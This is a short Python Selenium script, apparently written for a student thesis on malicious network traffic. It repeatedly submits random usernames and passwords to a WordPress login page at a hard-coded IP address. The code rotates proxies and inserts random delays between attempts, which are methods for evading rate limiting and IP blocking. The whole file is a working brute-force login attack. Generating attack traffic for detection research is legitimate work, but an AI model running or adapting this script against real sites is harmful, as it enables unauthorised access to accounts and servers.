import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, NoSuchWindowException
import time

#IMPORT FOLDER OF THE MODULES
import sys
sys.path.extend(['/home/expresidentz/Desktop/skripsi-malicious-traffics-unhas/benign/register',
                 '/home/expresidentz/Desktop/skripsi-malicious-traffics-unhas/',
                 '/home/rayyanekaputra/Desktop/skripsi😭/',
                 '/home/rayyanekaputra/Desktop/skripsi😭/benign/register',
                 ])

#MODULES
from EmailMaker import NamesPickRandom
from PasswordMaker import PasswordPickRandom
from ProxyTest import CheckIfProxySameAsIP

i = 0
while True:
    try:
        proxy_raw, proxy_complete = CheckIfProxySameAsIP()
        options = webdriver.ChromeOptions() 
        print(f"Starting chrome with {proxy_complete}")
        options.add_argument(f'--proxy-server={proxy_complete}')
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--start-maximized")
        driver = webdriver.Chrome(options=options)

        # driver.set_window_position(2000, 0)
        driver.implicitly_wait(2)
        driver.get("https://103.185.193.35/wp-login.php")
       
        while True:
            print(f"Bruteforcing #{i}")
            driver.find_element(by=By.ID, value="user_login").send_keys(NamesPickRandom())
            time.sleep(1)
            driver.find_element(by=By.ID, value="user_pass").send_keys(PasswordPickRandom())
            time.sleep(1)
            driver.find_element(by=By.ID, value="wp-submit").click()
            time.sleep(1)

             # Introduce a random timeout between 2 and 5 seconds
            timeout = random.uniform(2, 5)
            print(f"Waiting for {timeout:.2f} seconds before the next attempt...")
            time.sleep(timeout)

            i = i+1
        
    except NoSuchElementException:
    # Handle the "Element not found" exceptionddd
        print("Website Failed to Load!")
        driver.quit()



